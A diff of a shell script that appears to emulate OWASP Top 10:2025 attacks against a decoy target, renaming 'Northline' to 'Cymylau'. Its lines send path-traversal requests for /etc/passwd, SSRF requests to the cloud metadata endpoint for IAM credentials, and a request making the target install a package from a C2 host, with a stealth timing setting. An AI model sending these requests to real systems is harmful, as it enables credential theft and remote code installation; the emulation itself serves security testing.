@@ -62,7 +62,7 @@ mark() { st_mark "OWASP-$1" "$2"; }
 # volume for burst-style scenarios, scaled down as stealth rises
 case "$ST_TIMING" in 0) BURST=30 ;; 1) BURST=15 ;; 2) BURST=8 ;; *) BURST=4 ;; esac
 
-say "Northline :: OWASP Top 10:2025 emulation :: session=$SESSION target=${BASE}"
+say "Cymylau :: OWASP Top 10:2025 emulation :: session=$SESSION target=${BASE}"
 say "$(st_banner) burst=${BURST}"
 
 if [ -z "$(ACT_OFF=1 st_http GET "${BASE}/health")" ]; then
@@ -80,7 +80,7 @@ a01() {
     mark A01 path-traversal; req "path traversal -> /etc/passwd" GET "/files?name=$(enc '../../../../etc/passwd')"
     mark A01 ssrf
     req "SSRF -> decoy IMDS role list" GET "/fetch?url=$(enc 'http://169.254.169.254/latest/meta-data/iam/security-credentials/')"
-    req "SSRF -> decoy IMDS credentials" GET "/fetch?url=$(enc 'http://169.254.169.254/latest/meta-data/iam/security-credentials/northline-decoy-role')"
+    req "SSRF -> decoy IMDS credentials" GET "/fetch?url=$(enc 'http://169.254.169.254/latest/meta-data/iam/security-credentials/cymylau-decoy-role')"
     req "SSRF -> internal service (control-api)" GET "/fetch?url=$(enc "http://${C2_HOST}:${C2_PORT}/logging/status")"
 }
 a02() {
@@ -92,7 +92,7 @@ a02() {
 a03() {
     step "A03 Software Supply Chain Failures"
     mark A03 unsigned-package
-    req "install unsigned package from arbitrary URL" POST "/plugins/install" "{\"url\":\"http://${C2_HOST}:${C2_PORT}/pkg/northline-utils.py\"}"
+    req "install unsigned package from arbitrary URL" POST "/plugins/install" "{\"url\":\"http://${C2_HOST}:${C2_PORT}/pkg/cymylau-utils.py\"}"
 }
 a04() {
     step "A04 Cryptographic Failures"
